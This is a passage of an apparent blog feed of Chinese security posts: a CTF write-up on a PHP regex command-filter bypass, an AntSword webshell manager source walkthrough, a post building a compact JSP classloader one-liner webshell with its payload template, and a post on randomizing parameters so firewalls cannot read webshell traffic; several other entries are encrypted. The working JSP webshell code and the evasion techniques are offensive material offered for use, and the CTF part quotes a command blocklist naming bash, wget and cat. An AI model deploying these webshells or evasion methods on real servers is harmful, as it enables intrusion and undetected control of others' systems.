after.class看一下修改后的结果192.168.88.129总共是14个byte，换成16进制就是0xe，刚好符合。实际中是否能用呢？回车，获得会话，说明修改是有效的。最后As_Exploits还在开发中，不得不说很麻烦，同一个功能要写asp/aspx/php/jsp四份代码。后端还可以写写，前端是真的要现学，不过还是可以期待一下。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[蚁剑改造计划之支持内存马]]></title>
    <url>%2Fposts%2Fantsword-diy-5%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
  </entry>
  <entry>
    <title><![CDATA[Tomcat内存Webshell解析之Listener型]]></title>
    <url>%2Fposts%2Ftomcat-memory-webshell-listener%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Tomcat内存Webshell解析之Filter型]]></title>
    <url>%2Fposts%2Ftomcat-memory-webshell-filter%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ASP/ASPX下的流量混淆]]></title>
    <url>%2Fposts%2Fasp-aspx-encoders%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[从一道CTF的非预期解看PHP反斜杠匹配问题]]></title>
    <url>%2Fposts%2Fphp-preg-tricks%2F</url>
    <content type="text"><![CDATA[前言刷buuoj的时候遇到[安洵杯 2019]easy_web 这样一个题，做一半看到他这个正则写的有点问题，就去翻wp。找到了官方的wp发现果然是个非预期。但是官方wp中并没有深入说明。后来看到评论去翻出题人的博客也没找到相关的信息，加上看到了其他wp中一些不准确的说法，所以今天就有了这篇文章来讲一讲自己的看法。正文题目源码12345678910111213141516171819202122232425262728&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&apos;content-type:text/html;charset=utf-8&apos;);$cmd = $_GET[&apos;cmd&apos;];if (!isset($_GET[&apos;img&apos;]) || !isset($_GET[&apos;cmd&apos;])) header(&apos;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&apos;);$file = hex2bin(base64_decode(base64_decode($_GET[&apos;img&apos;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &apos;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&apos;; die(&quot;xixi～ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot; . $txt . &quot;&apos;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;前面md5碰撞已经是老套路了，问题出在后面对shell命令的过滤上。1234if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125;熟悉php代码审计的同学应该都知道，在preg_match中要过滤\ 是需要四个\\\\才可以达到目的，原理如下：123456789101112$str = &apos;\/div&apos;;$pattern = &apos;/\\\\\/div/&apos;;// &apos;\\\\\/&apos; 解析过程如下：// PHP解析：// 第1个&apos;\&apos;转义第2个&apos;\&apos;，转义后为字符串&apos;\&apos;// 第3个&apos;\&apos;转义第4个&apos;\&apos;，转义后为字符串&apos;\&apos;// 第5个&apos;\&apos;转义&apos;/&apos;，转义后为字符串&apos;/&apos;// 字符合起来为&apos;\\/&apos; （则 \\/div 即为正则将要解析的内容，注意：正则解析的内容已经不包括正则标识符//）// 正则解析器解析：// 两个&apos;\\&apos; 正则表达式看做&apos;\&apos; （则正则最终解析为 \/div）$rs = preg_match($pattern, $str, $arr);if($rs) print_r($arr); // Array ( [0] =&gt; \/div )但是出题人似乎觉得不够，又在后面加了四个反斜杠的匹配，似乎本意是要过滤\跟\\？理论来说已经出现了四个\\\\了，但是为什么还会造成非预期ca\t这种解呢？我们本地测试一下去掉其他的乱七八糟的东西，只留下对于反斜杠等的过滤可以看到虽然正则中有\\\\，但是却无法过滤到反斜杠。反向思考其原因，应该是问题出在前面两个反斜杠的匹配部分。因为正则匹配中相当于要经过两层解析器解析，一层是php的，一层是正则表达式的。所以此处前面的两个反斜杠经过php解析器处理后应该是表示了一个转义号\，之后又与后面的表示逻辑或的|结合到一起，从而在正则表达式解析器中解析为\|。又因为|是正则中的保留符号，所以需要一个转义符来转义。所以最后的实现效果应为对于字符|的过滤。所以我们猜测这种写法真正被解析的结果应该是对于字符串|\的过滤，即不是单独的\的匹配。我们来验证一下猜想是否正确：可以看到此时已经触发了正则匹配机制，输出了forbid。所以综上所述：非预期的原因是错误的正则写法匹配了|\，而非预期的\错误的一些说法第一个https://www.cnblogs.com/20175211lyz/p/12189515.html这篇文章中提到反斜杠有这么多种匹配方法，如果你做实验的话发现也确实会输出1234。事实真的是这样吗？随便写个字符串，发现134照样可以匹配到。原因是134条规则都在左右多加了个|，然而|左右为空，也就是说对于任意空字符串都可以匹配，而并非预期的目的。第二个这篇文章的解释是把\t当成tab，这个就更离谱了。https://blog.csdn.net/SopRomeo/article/details/104124545第三个https://www.jianshu.com/p/21e3e1f74c08这个同学自己调试了一番，离真相就差一点啦。最后纸上得来终觉浅，绝知此事要躬行。与君共勉。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中国蚁剑源码分析]]></title>
    <url>%2Fposts%2Fantsword-diy-4%2F</url>
    <content type="text"><![CDATA[前言发现很多同学对于蚁剑的基本流程还有源码结构不太熟悉，所以就有了这一篇比较基础的文章，来讲一讲自己对于蚁剑的一些认识。通过阅读本篇文章，你可以了解蚁剑的源码结构、运行流程、以及自己动手diy时要注意的几个地方。正文目录结构12345678910111213/antData/ 用户目录/modules/ 蚁剑后端模块/node_modules/ 安装的node模块/source/ 核心模块 /base/ 自定义的功能类 /core/ payload模板 /language/ 语言模块 /modules/ 显示模块 /ui/ UI模块 /app.entry.js 渲染程序入口 /load.entry.js 前端加载模块/static/ 静态资源文件/views/ 前端文件其中最核心的是modules目录跟source目录。modules里的内容为蚁剑的后端模块，属于主进程。source中存放着蚁剑运行的核心代码，属于渲染进程。如何debug蚁剑的开发栈主要是：javascript / nodejs / electron。Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。通过Node它提供了通常浏览器所不能提供的能力。简单来说就是chrome里跑nodejs。所以想要对蚁剑二次开发，要首先熟悉一下nodejs的基本语法。electron里面又分主进程跟渲染进程，对于主进程的调试需要用到vscode等，而对于渲染进程只需要用到蚁剑中自带的dev tool就可以。具体可以看这篇文章：https://blog.csdn.net/gary_yan/article/details/78973336一般来说，我们并不需要对modules中的后端模块进行修改，所以一般不会用到主进程调试，仅仅蚁剑中自带的dev tool就可以完成我们日常的调试工作。打开蚁剑-&gt;调试-&gt;开发者工具即可看到调试工具。是不是跟chrome一模一样？其中console用于打印输出日志，蚁剑中默认的日志只会打印前100个字符，如果要查看完整日志需要输入antsword.logs[id]查看，在这里我们直接查看所有日志。我们先连接上本地的shell，然后打印完整日志，就可以看到我们发包的很多参数，包括shell的配置， 编码器设置，字符编码，返回内容等等那么我们在哪里下断点呢答案是在控制台sources-&gt;no domain下面,打开后我们可以看到渲染进程中加载到的各种资源、模块然后我们找到想下断点的文件，就拿php的base64编码器为例，在其10行处点击一下会出现蓝标，就表示下断点成功。此时我们在shell管理界面右键-&gt;刷新目录，就可以看到程序已经断到了我们下断点的地方，在右边可以看到此时的调用栈还有各种变量信息，就可以愉快的调试了。执行流程主程序入口：app.js/source/load.entry.js 前端加载模块/source/app.entry.js 渲染程序入口/source/modules/filemanager/index.js 监听用户操作/source/core/php/template/ 提取组合Payload/source/core/base.js 发送事件与配置到后端request模块解析、回显就按刚才php base64编码器为例，我们看一下蚁剑是如何运行到这一步的。查看上一个调用栈，发现是进入到了编码器处理部分，编码器会接收到三个参数：shell密码、初步payload、还有ext参数。其中ext参数即为shell的配置信息还有rsa对象的组合，这也是为什么我们在写编码器的时候可以直接获取到shell的各种配置信息。再往上看，发现complete函数调用了encodeComplete函数，complete负责将payload套入到模板中，并且设置数据前后分割符，发送给encodeComplete进行处理。再进入到core/base中的request函数，此函数负责将组合完成的数据包发送到后端的request模块。那么是如何触发到这个请求功能的呢，我们直接跳到最开始的点击事件来看。发现是当我们点击刷新目录后，会触发refreshPath函数。然后refreshPath函数分析是否有传递的路径参数，如果没有则为刷新当前目录。然后gotoPath调用了this.manager.getFiles函数。getFiles函数调用this.core.request，第一个参数为this.core.filemanager.dir，即为payload模板中的dir部分。接着组合、发送payload数据包，获取回显并解析。其中解析跟回显部分不是我们关注的重点，我们关注的重点主要是提取组合payload到发送最终数据包的阶段。大家自己调试一下就明白其中的流程了。修改数据包的几个重点位置其中，如果要修改发送的数据包，有三个位置可以供我们参考。\source\core\base.js#187 模板组合（作用对象为全体）\source\core\php\encoder\base64.js 编码器处理（作用于当前类型）\modules\request.js 最终发包（不建议修改）不建议修改后端最终发包是因为蚁剑中后端默认不能获取到所有的opt配置内容，除非自己加，我觉得比较麻烦。配合opt参数实现自定义设置opt参数中有shell的所有配置，通过此项可以做到动态修改数据包的内容。比如说我在基于随机Cookie的蚁剑动态秘钥编码器中就是利用ext.opts.httpConf.headers['Cookie'] = xxx在数据包头部添加了一个cookie作为秘钥在编码器中要用ext.opts.xxx来访问你想要访问的配置内容，在其他地方一般用this.__opts__.xxx或者opts['xxx']即可。最后在实现蚁剑jsp一句话的过程中，我使用了额外传递参数的方式来决定采用什么编码器、什么字符编码等。大家可以看一下我在编码器中的写法。这个方法是挺简单，但是特征也比较明显。那么怎么办呢？相信你读完这篇文章后已经可以试着自己去改掉这个特征，有好的想法欢迎跟我交流。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑改造计划之实现JSP一句话]]></title>
    <url>%2Fposts%2Fantsword-diy-3%2F</url>
    <content type="text"><![CDATA[前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。蚁剑改造计划之实现动态秘钥编码器解码器蚁剑改造计划之基于随机Cookie的动态秘钥编码器蚁剑改造计划之增加垃圾数据蚁剑改造计划之实现其他参数的随机化正文基本原理由于Java中没有所谓的eval函数，无法对直接传递的代码进行解析执行。所以不管是蚁剑还是菜刀对于JSP的shell一直是采用custom模式，即把要执行的代码提前写在shell中，然后每次只需要传递要调用的函数名以及对应的参数即可。虽然可以实现相应的功能，但是带来一个问题就是shell体积非常巨大。菜刀的jsp脚本有7kb大小，蚁剑的jsp custom脚本即使去掉注释后还有17k之多，用起来非常的不方便。冰蝎的作者rebeyond大佬在文章 利用动态二进制加密实现新型一句话木马之Java篇 中提出了一种新的jsp一句话的实现方式：利用classloader直接解析编译后的class字节码，相当于实现了一个java的eval功能。反复阅读rebeyond大佬的文章，不得不感叹思路的巧妙。自己以前通过类反射+动态加载字节码的方式实现了一个命令执行后门，但是是在shell中获取的输入输出。参数个数也不可控，只能一股脑按最大数传进去，还会有类反射的特征。然而冰蝎是直接重写了Object类的equals方法，并且把pageContext传了进去。熟悉jsp的同学都知道，通过pageContext就可以控制几乎所有的页面对象，也就可以在payload中动态控制输入输出。冰蝎的方法既没有类反射之类的特征，又便于控制输入输出，实在是妙。但是冰蝎很久没更新了，并且暂时没有开源，有些小BUG修改起来非常麻烦。我就想能否把这个功能给移植到蚁剑上。冰蝎的操作是直接用asm框架来修改提前写好的字节码文件，把要传入的参数直接编译进去。由于冰蝎自身就是java写的，所以动态产生字节码具有天生的优势。但是蚁剑的后端是nodejs，这怎么办呢？思路的选择大概有以下三种思路：（1）用nodejs来修改java字节码。（2）写一个专门用来生成payload的jar包，每次执行前调用此jar包，把需要编译的参数通过命令行传入，然后获取回显。（3）在蚁剑中硬编码payload，然后通过getParameter把参数传进去。三种方式各有利弊，第一个想法最简单，但是难度大。超出了本人菜鸟教程上学来的java跟node水平。自己本来是想采用第二个思路，跟yan表哥交流后放弃。就不说用exec调用会不会产生命令注入这种东西，采用第二种方式需要修改蚁剑原有的模式框架，并且还需要配置java环境。而蚁剑从设计之初就是想着能尽量减少对环境的需求。尽管从2.0系列推出加载器后不再需要node环境就可以运行蚁剑，但是目前还是有一堆人连安装蚁剑都有困难。所以在本文中实现的是第三种思路，硬编码payload+其他参数传参。首先根据现成的custom脚本来编写payload，然后把custom的模板给复制一份，把传递的函数名替换成payload即可。采用这种模式的话就跟其他shell发送payload的模式相同，不需要对蚁剑原有的框架进行大改。只不过其他类型传递的是可见的代码，jsp传递的是编译后的字节码。具体实现编译环境的选择首先是编译环境的问题。要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。编译命令1javac -cp &quot;D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar&quot; Test.java保存编译后的class字节码1base64 -w 0 Test.class &gt; Test.txt乱码问题的解决然后是让人头秃的乱码问题。众所周知windows采用的是GBK，不是UTF-8。本来想学习一下蚁剑custom脚本中是如何实现的，结果发现了一个存在了四年的编码逻辑错误。在php版的custom中对于编码是这样处理的：其中EC是识别charset的，也就是分辨UTF8还是GBK，然后用mb_convert_encoding函数转换到指定的编码中。decode函数是对字符串进行解码，比如说base64、hex这种。但是难道不应该先base64解码之后再判断charset吗，直接对base64的内容进行charset判断肯定是有问题的。调试了一下果然会乱码，然后报找不到路径的错误。解决方法就是把两个函数换换位置就好了。换了之后就可以正常进入中文路径了。因为在vscode中设置变量以UTF8显示，所以此时左边GBK编码的路径会显示乱码，但是函数中是可以正常识别的。把jsp的custom脚本中函数换了位置后，中文文件可以正常显示，但是进入中文路径的时候还是会报空指针错误。突然想起来自己以前提的一个issue jsp的bug，其实也是路径中出现了中文的问题，不过当时没有细究就略过了。经过调试后发现只要把hex跟base64解码后，强制使用UTF8编码就可以正常进入中文路径。原因为什么呢？因为base64对GBK类型的中文和跟UTF8类型的中文编码结果是不一样的，然而抓包发现蚁剑在custom模式下，不管用户选择的编码是什么都是对UTF8编码的中文进行base64处理。但是经过测试php类型会正常的根据用户的字符类型来base64编码。emmmm，玄学问题。最简单的解决方法就是直接在payload中base64解码的时候强制使用UTF-8解码。模板设计Shell模板123456789101112131415161718&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;&lt;%! class U extends ClassLoader&#123; U(ClassLoader c)&#123; super(c); &#125; public Class g(byte []b)&#123; return super.defineClass(b,0,b.length); &#125; &#125; BASE64Decoder decoder=new sun.misc.BASE64Decoder();%&gt;&lt;% String cls=request.getParameter(&quot;ant&quot;); if(cls!=null)&#123; new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext); &#125;%&gt;压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。1&lt;%!class U extends ClassLoader&#123; U(ClassLoader c)&#123; super(c); &#125;public Class g(byte []b)&#123; return super.defineClass(b,0,b.length); &#125;&#125;%&gt;&lt;% String cls=request.getParameter(&quot;ant&quot;);if(cls!=null)&#123; new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); &#125;%&gt;Payload模板其中encoder为编码方式，默认为空，可选hex或者base64。charset为字符编码，默认UTF-8。蚁剑将会根据用户的选择自动发送。注意：特别不建议选用默认编码器，遇到中文路径会错误，我也不知道为什么。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.jsp.PageContext;import java.io.ByteArrayOutputStream;public class Demo &#123; public String encoder; public String cs; @Override public boolean equals(Object obj) &#123; PageContext page = (PageContext)obj; ServletRequest request = page.getRequest(); ServletResponse response = page.getResponse(); encoder = request.getParameter(&quot;encoder&quot;)!=null?request.getParameter(&quot;encoder&quot;):&quot;&quot;; cs=request.getParameter(&quot;charset&quot;)!=null?request.getParameter(&quot;charset&quot;):&quot;UTF-8&quot;; StringBuffer output = new StringBuffer(&quot;&quot;); StringBuffer sb = new StringBuffer(&quot;&quot;); try &#123; response.setContentType(&quot;text/html&quot;); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); String var0 = EC(decode(request.getParameter(&quot;var0&quot;)+&quot;&quot;)); String var1 = EC(decode(request.getParameter(&quot;var1&quot;)+&quot;&quot;)); String var2 = EC(decode(request.getParameter(&quot;var2&quot;)+&quot;&quot;)); String var3 = EC(decode(request.getParameter(&quot;var3&quot;)+&quot;&quot;)); output.append(&quot;-&gt;&quot; + &quot;|&quot;); sb.append(func(var1)); output.append(sb.toString()); output.append(&quot;|&quot; + &quot;&lt;-&quot;); page.getOut().print(output.toString()); &#125; catch (Exception e) &#123; sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString()); &#125; return true; &#125; String EC(String s) throws Exception &#123; if(encoder.equals(&quot;hex&quot;)) return s; return new String(s.getBytes(), cs); &#125; String decode(String str) throws Exception&#123; if(encoder.equals(&quot;hex&quot;))&#123; if(str==&quot;null&quot;||str.equals(&quot;null&quot;))&#123; return &quot;&quot;; &#125; String hexString = &quot;0123456789ABCDEF&quot;; str = str.toUpperCase(); ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2); String ss = &quot;&quot;; for (int i = 0; i &lt; str.length(); i += 2)&#123; ss = ss + (hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))) + &quot;,&quot;; baos.write((hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1)))); &#125; return baos.toString(&quot;UTF-8&quot;); &#125;else if(encoder.equals(&quot;base64&quot;))&#123; byte[] bt = null; sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder(); bt = decoder.decodeBuffer(str); return new String(bt,&quot;UTF-8&quot;); &#125; return str; &#125; String func (String var1)&#123; // Your code &#125;&#125;举个栗子，写一个返回hello+名字的函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.jsp.PageContext;import java.io.ByteArrayOutputStream;public class Test &#123; public String encoder; public String cs; @Override public boolean equals(Object obj) &#123; PageContext page = (PageContext)obj; ServletRequest request = page.getRequest(); ServletResponse response = page.getResponse(); encoder = request.getParameter(&quot;encoder&quot;)!=null?request.getParameter(&quot;encoder&quot;):&quot;&quot;; cs=request.getParameter(&quot;charset&quot;)!=null?request.getParameter(&quot;charset&quot;):&quot;UTF-8&quot;; StringBuffer output = new StringBuffer(&quot;&quot;); StringBuffer sb = new StringBuffer(&quot;&quot;); try &#123; response.setContentType(&quot;text/html&quot;); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); String var0 = EC(decode(request.getParameter(&quot;var0&quot;)+&quot;&quot;)); output.append(&quot;-&gt;&quot; + &quot;|&quot;); sb.append(test(var0)); output.append(sb.toString()); output.append(&quot;|&quot; + &quot;&lt;-&quot;); page.getOut().print(output.toString()); &#125; catch (Exception e) &#123; sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString()); &#125; return true; &#125; String EC(String s) throws Exception &#123; if(encoder.equals(&quot;hex&quot;)) return s; return new String(s.getBytes(), cs); &#125; String decode(String str) throws Exception&#123; if(encoder.equals(&quot;hex&quot;))&#123; if(str==&quot;null&quot;||str.equals(&quot;null&quot;))&#123; return &quot;&quot;; &#125; String hexString = &quot;0123456789ABCDEF&quot;; str = str.toUpperCase(); ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2); String ss = &quot;&quot;; for (int i = 0; i &lt; str.length(); i += 2)&#123; ss = ss + (hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))) + &quot;,&quot;; baos.write((hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1)))); &#125; return baos.toString(&quot;UTF-8&quot;); &#125;else if(encoder.equals(&quot;base64&quot;))&#123; byte[] bt = null; sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder(); bt = decoder.decodeBuffer(str); return new String(bt,&quot;UTF-8&quot;); &#125; return str; &#125; String test(String var0)&#123; return &quot;Hello&quot; + var0; &#125;&#125;将其编译成class文件，base64后输出到Test.txt中再发送payload，其中var0是我们要传入的参数。可以看到屏幕上打印出了Hello yzddmr6默认是明文传递，想要进行base64编码的话将encoder=base64加在请求中即可。如果是手工发送的话要注意：一定要URL编码！！！一定要URL编码！！！一定要URL编码！！！当初忘了给Payload URL编码，一直各种花式报错，卡在这里一天。。。最后在rebeyond大佬提醒下才反应过来。。。我真是个弟弟蚁剑客户端修改在\source\app.entry.js \source\core\index.js \source\modules\settings\encoders.js里增加jsp类型在\source\modules\shellmanager\list\form.js增加对jsp后缀shell类型的识别在base64编码器模板里增加发送的接口，虽然没有实现decoder，但是还是留个接口吧。然后就是用编译后的payload替换原来的函数名实现效果本地每个功能都测试过，也完美支持中文。用起来跟其他类型的shell没有什么区别，四舍五入那就等于没BUG吧~最后有同学可能会问为什么不写回显信息编码函数呢？因为在目前方式下特征太明显了，根本不需要根据回显信息就可以识别。写了后还会导致payload很长，并且还会增加一个decoder=xxx的特征，所以就没加。同时传递的encoder=xxx也没有编码，不管怎么编码都是WAF加一条规则的事情。目前只是处在能用的阶段，无法做到随机变量名等操作，存在很多的硬性特征。在找到有效的解决方法前，本功能可能并不会合并到蚁剑主体中。因为payload实在是太多了，所以我就单独开了一个项目来存放源码：JspForAntSword 如果有什么好的建议欢迎提pr修改后的蚁剑(2.1.x分支)：https://github.com/yzddmr6/antSword/tree/v2.1.x感谢@rebeyond大佬的提醒，同时也感谢@Medici.yan表哥这几天一直跟我交流那么多。深刻的体会到独学则无友。如果有什么写的不对的地方希望师傅们提出，希望大佬们能多带带弟弟QAQ。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑改造计划之实现其他参数的随机化]]></title>
    <url>%2Fposts%2Fantsword-diy-2%2F</url>
    <content type="text"><![CDATA[前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。蚁剑改造计划之实现动态秘钥编码器解码器蚁剑改造计划之基于随机Cookie的动态秘钥编码器蚁剑改造计划之增加垃圾数据正文历史遗留问题我在前面几篇文章提到过，蚁剑一直有一个硬伤就是它对于其他参数的处理仅仅是一层base64。这就导致了不管怎么对主payload加密，WAF只要分析到其他的参数就能知道你在做什么。例如你在执行cmd的时候，就一定会发送一个经过base64编码的cmd字符串，这就留下了一个被WAF识别的特征。即使是蚁剑编码器仓库中的aes编码器也只是对主payload加了密，防护方在不需要解密主payload的情况下只要看到其他参数传的什么内容就能推测攻击者的行为。yan表哥曾经在公众号中的WAF拦了蚁剑发送的其它参数时怎么操作文章中给出了一种解决方案。主要思想就是在不修改主payload的情况下，配合客户端额外再把它加密解密一遍。可以是可以，但是很麻烦，对于普通的shell不具有适用性。这篇文章的目的就是解决掉这个历史遗留问题。随机化方式的选择想要从根本上解决问题就要修改核心payload，那么怎么改呢？以前师傅们的文章提出过两个方法，一种是把其他参数base64两次，还有一种是在其他参数前面加两个随机字符，然后主payload中再把它给substr截掉，来打乱base64的解码。如果方法是写死的话，无非只是WAF增加两条规则而已。蚁剑这么有名的项目，一定是防火墙商眼中紧盯的目标。最好的解决办法就是加入一个用户可控的参数，能够让用户自定义修改。这样才有可能最大程度的逃过WAF的流量查杀。所以本文采用的方法就是在每个第三方参数前，加入用户自定义长度的随机字符串，来打乱base64的解码。这时，如果WAF不能获得主payload中用户预定义的偏移量，也就无法对其他参数进行解密。此时我们的强加密型编码器才能真正起到作用。具体实现思路1获取用户预定义前缀偏移量-&gt;修改核心payload模版-&gt;给其他参数前增加随机字符串前端的话首先写一个text框，来获取用户的输入在\source\core\base.js中定义randomPrefix变量在\source\modules\settings\adefault.js中设置默认值然后后端就可以通过opts.otherConf[&quot;random-Prefix&quot;]来获取用户定义的随机前缀的长度值。修改模版前要简单了解一下蚁剑对于参数的处理流程在各类型shell的模版文件中，会定义默认的payload以及他们所需要的参数，还有对于参数的编码方式。1source\core\php\template\filemanager.js在获取到模版之后，parseTemplate会对其中的参数进行提取、解析、组合，形成要发送的payload1source\core\base.js所以我们要把用户预定义的前缀偏移量传入到两个地方：（1）核心payload模版（2）其他参数的组合模块在核心payload中，我们将要修改的偏移量用#randomPrefix#进行标记，到parseTemplate函数组合最终数据包的时候将其替换。然后定义一个新类型的编码处理器newbase64，在模板中修改对于参数的处理函数。1234567891011121314/** * 增加随机前缀的base64编码 * @param &#123;String&#125; str 字符串 * @return &#123;String&#125; 编码后的字符串 */ newbase64(str) &#123; let randomString=(length)=&gt;&#123; let chars=&apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; let result = &apos;&apos;; for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; &#125; return randomString(randomPrefix)+Buffer.from(iconv.encode(Buffer.from(str), encode)).toString(&apos;base64&apos;); &#125;修改后的模板长这个样期间遇到一个小坑，就是无法在format()函数中获取opts的值后来发现蚁剑中是这样写的还特意把原来的new this.format给注释掉换成Base.prototype.format的形式，具体原因我也不知道为什么。如果有知道的师傅麻烦告诉我一下。既然追求刺激，那就贯彻到底，直接把opts传给format函数，然后在format中重新取所需要的变量。测试前缀长度默认为2，可以自行修改，只要不是4的倍数即可(原因自己思考一下)。可以正常使用其中prototype为我们传入的第三方参数的值，在这里是要打开目录的绝对路径1prototype=ojRDovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXL3BocE15QWRtaW4v直接base64解码会是乱码去掉前两位后我们进行解码则可以得到正确的结果。最后偏移两位的效果可能还不是很明显，容易被猜出。但是当前缀长度达到10位以上的时候，就很难分析出最后的结果。对php类型修改后我在本地测试了主要的13个功能，均可以正常使用。但是由于涉及到修改核心payload，等确定没有bug了再改其他的。由于我是在父类Base中修改的编码模块，想修改其他类型的shell只需要照葫芦画瓢改一下对应的模版即可。修改后的项目地址：https://github.com/yzddmr6/antSword/tree/v2.1.x]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[知识星球]JSP类加载后门]]></title>
    <url>%2Fposts%2Fjsp-classload-backdoor%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebShell免杀之JSP]]></title>
    <url>%2Fposts%2Fwebshell-bypass-jsp%2F</url>
